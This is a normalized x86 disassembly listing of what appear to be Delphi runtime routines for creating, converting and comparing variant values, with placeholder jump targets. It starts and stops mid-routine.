mov edx [ ebp - 0x6c ]
mov eax esi
call sub_4070a8
jmp r-xdata
jmp r-xdata
sub_42106c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4210d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_41c5f0
lea eax [ ebp - 0x10 ]
call [ rw-data ]
cmp [ ebp - 0x10 ] 0xd
je r-xdata
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_409ccc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4210dd
lea eax [ ebp - 0x10 ]
call sub_41c288
retn
mov dx 0xd
mov ax 0x101
call sub_41ba38
sub_4210e4
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
movzx eax [ ebx ]
cmp eax 0xd
jg r-xdata
sub eax 0x101
je r-xdata
je r-xdata
mov edx ebx
mov eax esi
call sub_42106c
jmp r-xdata
sub eax 0x3f08
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_409ccc
jmp r-xdata
sub eax 0x1
jb r-xdata
pop edx
pop esi
pop ebx
retn
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_409ccc
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax esi
call sub_409cb4
jmp r-xdata
je r-xdata
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub eax 0x8
je r-xdata
mov edx esp
movzx eax [ ebx ]
call sub_422ab0
test al al
je r-xdata
mov eax esi
call sub_409cb4
jmp r-xdata
mov dx 0xd
mov ax 0x1
call sub_41ba38
jmp r-xdata
movzx eax [ ebx ]
mov dx 0xd
call sub_41ba38
mov eax esi
call sub_409cb4
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_4056b8
test al al
jne r-xdata
sub_4211b0
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
movzx eax [ ebx ]
sub ax 0x1
jb r-xdata
mov eax esi
call sub_409cb4
jmp r-xdata
je r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0x8
je r-xdata
mov eax esi
call sub_409cb4
jmp r-xdata
mov dx 0x9
mov ax 0x1
call sub_41ba38
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_409ccc
jmp r-xdata
sub ax 0x4000
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_409ccc
jmp r-xdata
jmp r-xdata
mov edx esp
movzx eax [ ebx ]
call sub_422ab0
test al al
je r-xdata
movzx eax [ ebx ]
mov dx 0x9
call sub_41ba38
mov eax esi
call sub_409cb4
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_4056b8
test al al
jne r-xdata
sub_42125c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi ] 0xbfe8
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax edi
call sub_41c1f4
mov [ edi ] 0x3
movsx eax bl
movzx eax [ eax * 2 + rw-data ]
mov [ edi ] ax
jmp r-xdata
mov [ edi + 0x8 ] esi
pop edi
pop esi
pop ebx
retn
sub_421298
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x3
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_41c1f4
sub_4212b8
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x11
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_41c1f4
sub_4212d8
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x12
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_41c1f4
sub_4212f8
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x13
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_41c1f4
sub_421318
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x15
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_41c1f4
sub_421344
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x10
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_41c1f4
sub_421364
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x2
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_41c1f4
sub_421384
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x14
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_41c1f4
sub_4213b0
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x4
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_41c1f4
sub_4213d4
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x5
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_41c1f4
sub_421400
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x6
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_41c1f4
sub_42142c
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x7
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_41c1f4
sub_421458
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0xb
cmp bl 0x1
cmc
sbb eax eax
mov [ esi + 0x8 ] ax
pop esi
pop ebx
retn
mov eax esi
call sub_41c1f4
sub_4214bc
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x100
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_4068f4
pop esi
pop ebx
retn
mov eax ebx
call sub_41c1f4
sub_4214e8
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
lea eax [ ebx + 0x8 ]
push eax
mov ecx 0x7fffffff
mov edx 0x1
mov eax esi
call sub_406ff0
pop esi
pop ebx
retn
mov eax ebx
call sub_41c1f4
sub_421520
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x102
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_4070a8
pop esi
pop ebx
retn
mov eax ebx
call sub_41c1f4
sub_42154c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0xd
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_409ccc
pop esi
pop ebx
retn
mov eax ebx
call sub_41c1f4
sub_421578
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x9
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_409ccc
pop esi
pop ebx
retn
mov eax ebx
call sub_41c1f4
sub_4215a4
push ebx
mov ebx eax
and bx 0xfff
cmp bx 0x15
jbe r-xdata
mov eax ebx
pop ebx
retn
cmp bx 0x100
je r-xdata
mov bx 0x8
jmp r-xdata
cmp bx 0x102
jne r-xdata
call sub_41bad4
sub_4215d0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
lea eax [ ebp - 0x11 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_421693
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x11 ]
call sub_41c5f0
cmp [ esi ] 0x101
jne r-xdata
cmp [ ebx ] 0x101
jne r-xdata
lea eax [ ebp - 0x11 ]
call [ rw-data ]
mov edx ebx
lea eax [ ebp - 0x11 ]
mov ecx edi
call sub_421ef8
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42169a
lea eax [ ebp - 0x11 ]
call sub_41c288
retn
lea eax [ ebp - 0x21 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_421667
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x21 ]
call sub_41c5f0
lea eax [ ebp - 0x21 ]
call [ rw-data ]
lea edx [ ebp - 0x21 ]
lea eax [ ebp - 0x11 ]
mov ecx edi
call sub_421ef8
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x21 ]
call sub_41c288
retn
sub_4216bc
push ebx
push ecx
mov [ esp ] dl
mov bl 0x1
mov edx ecx
sub edx 0xe
je r-xdata
movzx edx [ rw-data ]
sub dl 0x1
jb r-xdata
dec edx
je r-xdata
call sub_41bb28
jmp r-xdata
je r-xdata
movzx edx [ rw-data ]
sub dl 0x1
jb r-xdata
dec edx
sub edx 0x4
jb r-xdata
mov eax ebx
pop edx
pop ebx
retn
movzx ebx [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
call sub_41bb28
jmp r-xdata
je r-xdata
movzx edx [ rw-data ]
sub dl 0x1
jb r-xdata
jmp r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
movzx ebx [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
call sub_41bb28
jmp r-xdata
je r-xdata
call sub_41bad4
xor eax eax
jmp r-xdata
cmp [ esp ] 0x2
je r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
movzx ebx [ ecx * 2 + rw-data ]
jmp r-xdata
dec dl
je r-xdata
and eax 0x7f
movzx ebx [ eax + rw-data ]
jmp r-xdata
mov al 0x1
mov al 0x1
cmp [ esp ] 0x2
jne r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov bl 0x2
jmp r-xdata
cmp [ esp ] 0x2
jne r-xdata
and eax 0x7f
movzx ebx [ eax + rw-data ]
jmp r-xdata
xor ebx ebx
jmp r-xdata
mov bl 0x1
jmp r-xdata
sub_4217c4
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x14 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x14 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
jle r-xdata
cmp eax [ ebp + 0x8 ]
jbe r-xdata
pop ebp
retn 0x10
mov al 0x1
mov al 0x2
jmp r-xdata
jmp r-xdata
sub_421800
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x14 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
jae r-xdata
cmp eax [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x14 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
xor eax eax
jmp r-xdata
jbe r-xdata
cmp eax [ ebp + 0x8 ]
pop ebp
retn 0x10
mov al 0x1
mov al 0x2
jmp r-xdata
sub_421834
push ebp
mov ebp esp
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fwait
fnstsw ax
sahf
jae r-xdata
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fwait
fnstsw ax
sahf
jbe r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_421860
push ebp
mov ebp esp
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fwait
fnstsw ax
sahf
jae r-xdata
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fwait
fnstsw ax
sahf
jbe r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_42188c
push ebp
mov ebp esp
fild [ ebp + 0x10 ]
fild [ ebp + 0x8 ]
fcompp
fwait
fnstsw ax
sahf
jbe r-xdata
fild [ ebp + 0x10 ]
fild [ ebp + 0x8 ]
fcompp
fwait
fnstsw ax
sahf
jae r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_4218bc
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx edx
xor edx edx
push ebp
push sub_421917
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_420a64
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_420a64
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_410e70
xor edx edx
call sub_4217b0
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42191e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_4068c4
retn
sub_421928
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
movzx eax [ esi ]
call sub_4215a4
movzx eax ax
movzx ebx [ eax + rw-data ]
movzx eax [ edi ]
call sub_4215a4
movzx eax ax
movzx eax [ eax + rw-data ]
movzx edx al
movzx ecx bl
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 + rw-data ]
movzx edx [ ecx + edx ]
cmp edx 0xb
ja r-xdata
call sub_41bad4
mov al 0x1
jmp [ edx * 4 + jump_table_42197a ]
call sub_41bad4
mov al 0x1
jmp r-xdata
mov edx eax
mov eax ebx
call sub_4216a8
jmp r-xdata
mov ecx ebp
mov edx eax
mov eax ebx
call sub_4216bc
jmp r-xdata
mov eax edi
call sub_41ccf4
push eax
mov eax esi
call sub_41ccf4
pop edx
call sub_4217b0
jmp r-xdata
mov eax esi
call sub_41d82c
push edx
push eax
mov eax edi
call sub_41d82c
push edx
push eax
call sub_4217c4
jmp r-xdata
mov eax esi
call sub_41dcbc
push edx
push eax
mov eax edi
call sub_41dcbc
push edx
push eax
call sub_421800
jmp r-xdata
mov eax esi
call sub_41e53c
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax edi
call sub_41e53c
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_421834
jmp r-xdata
mov eax esi
call sub_41ed54
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax edi
call sub_41ed54
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_421860
jmp r-xdata
mov eax esi
call sub_41f350
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax edi
call sub_41f350
add esp 0xfffffff8
fistp [ esp ]
fwait
call sub_42188c
jmp r-xdata
mov edx edi
mov eax esi
call sub_4218bc
jmp r-xdata
mov eax edi
call sub_41dfd4
and eax 0x7f
push eax
mov eax esi
call sub_41dfd4
and eax 0x7f
pop edx
call sub_4217b0
jmp r-xdata
mov edx edi
mov eax esi
mov ecx ebp
call sub_4215d0
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_421ad4
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov ebx eax
mov [ ebp - 0xd ] 0x1
movzx esi [ ebx ]
mov eax esi
and ax 0xfff
cmp ax 0x10f
jae r-xdata
mov eax [ ebp - 0x8 ]
movzx eax [ eax ]
test ax ax
jne r-xdata
test si si
jne r-xdata
mov edx [ ebp - 0x8 ]
cmp ax 0x1
jne r-xdata
mov dl 0x1
xor eax eax
call sub_4216a8
mov [ ebp - 0xd ] al
jmp r-xdata
cmp si 0x1
jne r-xdata
xor edx edx
mov al 0x1
call sub_4216a8
mov [ ebp - 0xd ] al
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_422ab0
test al al
jne r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x2
xor eax eax
call sub_4216bc
mov [ ebp - 0xd ] al
jmp r-xdata
movzx eax [ ebp - 0xd ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax ]
call sub_422ab0
test al al
jne r-xdata
mov ecx [ ebp - 0xc ]
xor edx edx
mov al 0x2
call sub_4216bc
mov [ ebp - 0xd ] al
jmp r-xdata
lea eax [ ebp - 0x12 ]
push eax
mov edx [ ebp - 0x8 ]
mov ecx 0xb
mov eax [ ebp - 0x18 ]
mov esi [ eax ]
call [ esi + 0x8 ]
test al al
je r-xdata
call sub_41bad4
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov edx ebx
mov ecx 0xb
mov eax [ ebp - 0x1c ]
mov esi [ eax ]
call [ esi + 0x4 ]
test al al
je r-xdata
call sub_41bad4
jmp r-xdata
mov esi [ ebp - 0x8 ]
movzx esi [ esi ]
mov eax esi
and ax 0xfff
cmp ax 0x10f
jae r-xdata
mov eax [ ebp - 0x8 ]
movzx eax [ eax ]
cmp ax [ ebp - 0x12 ]
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_421c6f
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebx ]
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x2c ]
call sub_41c908
movzx eax [ ebp - 0x2c ]
and ax 0xfff
cmp ax [ ebx ]
je r-xdata
movzx eax [ ebx ]
cmp ax [ ebp - 0x10 ]
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
mov eax esi
call sub_422ab0
test al al
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_421e03
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0x8 ]
movzx ecx [ ecx ]
mov edx ebx
lea eax [ ebp - 0x2c ]
call sub_41c908
mov eax [ ebp - 0x8 ]
movzx eax [ eax ]
cmp ax [ ebp - 0x2c ]
je r-xdata
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0xc ]
lea edx [ edx * 2 + rw-data ]
movzx eax [ edx + eax - 0x1c ]
mov [ ebp - 0xd ] al
jmp r-xdata
lea eax [ ebp - 0x2c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_421d60
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0x12 ]
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x2c ]
call sub_41c908
movzx eax [ ebp - 0x2c ]
cmp ax [ ebp - 0x12 ]
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax ebx
mov ecx [ ebp - 0xc ]
call sub_421928
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x2c ]
call sub_41c288
retn
call sub_41b9e4
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0xc ]
lea edx [ edx * 2 + rw-data ]
movzx eax [ edx + eax - 0x1c ]
mov [ ebp - 0xd ] al
jmp r-xdata
lea eax [ ebp - 0x2c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_421be0
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0x10 ]
mov edx ebx
lea eax [ ebp - 0x2c ]
call sub_41c908
movzx eax [ ebp - 0x2c ]
and ax 0xfff
cmp ax [ ebp - 0x10 ]
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov edx ebx
mov ecx 0xb
mov eax [ ebp - 0x1c ]
mov esi [ eax ]
call [ esi + 0x4 ]
test al al
je r-xdata
call sub_41bad4
jmp r-xdata
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x2c ]
mov ecx [ ebp - 0xc ]
call sub_421928
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x2c ]
call sub_41c288
retn
call sub_41b9e4
mov eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0xc ]
lea edx [ edx * 2 + rw-data ]
movzx eax [ edx + eax - 0x1c ]
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x2c ]
call sub_41c288
retn
call sub_41b9e4
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0xc ]
lea edx [ edx * 2 + rw-data ]
movzx eax [ edx + eax - 0x1c ]
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x2c ]
call sub_41c288
retn
call sub_41b9e4
call sub_41bad4
movzx eax [ ebx ]
cmp ax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0xc ]
lea edx [ edx * 2 + rw-data ]
movzx eax [ edx + eax - 0x1c ]
mov [ ebp - 0xd ] al
jmp r-xdata
lea eax [ ebp - 0x2c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_421eba
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0x10 ]
mov edx ebx
lea eax [ ebp - 0x2c ]
call sub_41c908
movzx eax [ ebp - 0x2c ]
cmp ax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0xc ]
lea edx [ edx * 2 + rw-data ]
movzx eax [ edx + eax - 0x1c ]
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x2c ]
call sub_41c288
retn
call sub_41b9e4
sub_421ef8
push esi
push edi
movzx esi [ eax ]
movzx edi [ edx ]
cmp si 0x10f
jae r-xdata
cmp si 0x400c
jne r-xdata
cmp di 0x10f
jae r-xdata
cmp di 0x400c
jne r-xdata
mov eax [ eax + 0x8 ]
call sub_421ef8
jmp r-xdata
call sub_421928
pop edi
pop esi
retn
and si 0xfff
cmp si 0x10f
jae r-xdata
mov edx [ edx + 0x8 ]
call sub_421ef8
jmp r-xdata
pop edi
pop esi
retn
call sub_421ad4
and di 0xfff
cmp di 0x10f
jae r-xdata
call sub_421928
jmp r-xdata
sub_4221dc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4222ef
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi ebx
and di 0xfff
cmp di 0x15
ja r-xdata
cmp bx 0x100
jne r-xdata
mov eax esi
movzx edx di
mov edx [ edx * 4 + rw-data ]
call sub_4070a8
jmp r-xdata
cmp bx 0x102
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_4070a8
jmp r-xdata
test bh 0x20
je r-xdata
cmp bx 0x101
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_4070a8
jmp r-xdata
test bh 0x40
je r-xdata
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_407564
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_422ab0
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_4070a8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4222f6
lea eax [ ebp - 0xc ]
mov edx 0x2
call j_sub_4068c4
retn
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_407564
lea ecx [ ebp - 0xc ]
movzx eax di
mov edx 0x4
call sub_411b48
mov ecx [ ebp - 0xc ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax esi
call sub_407564
push esi
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4054c8
mov eax [ ebp - 0x8 ]
mov ecx 0x7fffffff
mov edx 0x2
call sub_4077d0
jmp r-xdata
sub_4223a0
push ebx
push esi
push edi
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_422390
mov esi eax
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movzx ebx [ esp + 0x4 ]
cmp bx 0x10f
jae r-xdata
mov edx esp
mov eax ebx
call sub_422ab0
test al al
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor eax eax
lea edx [ esp + 0x4 ]
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
jmp r-xdata
mov al 0x1
jmp r-xdata
movzx eax [ esp + 0x4 ]
cmp ax 0x9
je r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0xc ] 0x0
je r-xdata
cmp ax 0xd
jne r-xdata
xor eax eax
jmp r-xdata
sub_422414
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov eax ebx
call sub_422390
push esi
mov esi eax
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax esi
call sub_422390
push esi
mov esi eax
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
movzx eax [ esp ]
test ax ax
jne r-xdata
cmp ax 0x1
jne r-xdata
cmp [ esp + 0x10 ] 0x0
sete al
jmp r-xdata
movzx eax [ esp + 0x10 ]
sub ax 0x2
jae r-xdata
cmp [ esp + 0x10 ] 0x1
sete al
jmp r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx esi
call sub_422c48
sete al
xor eax eax
jmp r-xdata
sub_4224b0
push ebx
movzx ebx [ eax ]
cmp bx 0x400c
jne r-xdata
mov [ edx ] bx
test [ edx + 0x1 ] 0x20
setne bl
test bl bl
je r-xdata
mov eax [ eax + 0x8 ]
call sub_4224b0
mov ebx eax
jmp r-xdata
xor eax eax
mov [ ecx ] eax
test [ edx + 0x1 ] 0x40
je r-xdata
mov eax ebx
pop ebx
retn
mov eax [ eax + 0x8 ]
mov [ ecx ] eax
jmp r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
jmp r-xdata
sub_4224fc
add esp 0xfffffff8
test dl dl
je r-xdata
movzx eax [ eax ]
and ax 0x2000
cmp ax 0x2000
sete al
pop ecx
pop edx
retn
lea ecx [ esp + 0x4 ]
mov edx esp
call sub_4224b0
pop ecx
pop edx
retn
sub_42254c
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_4225ad
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi ]
call sub_408754
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4225b4
push rw-data
call LeaveCriticalSection
retn
mov eax [ esi ]
mov eax [ eax + ebx * 4 ]
cmp eax [ rw-data ]
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
call sub_4055f0
sub_4225c4
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
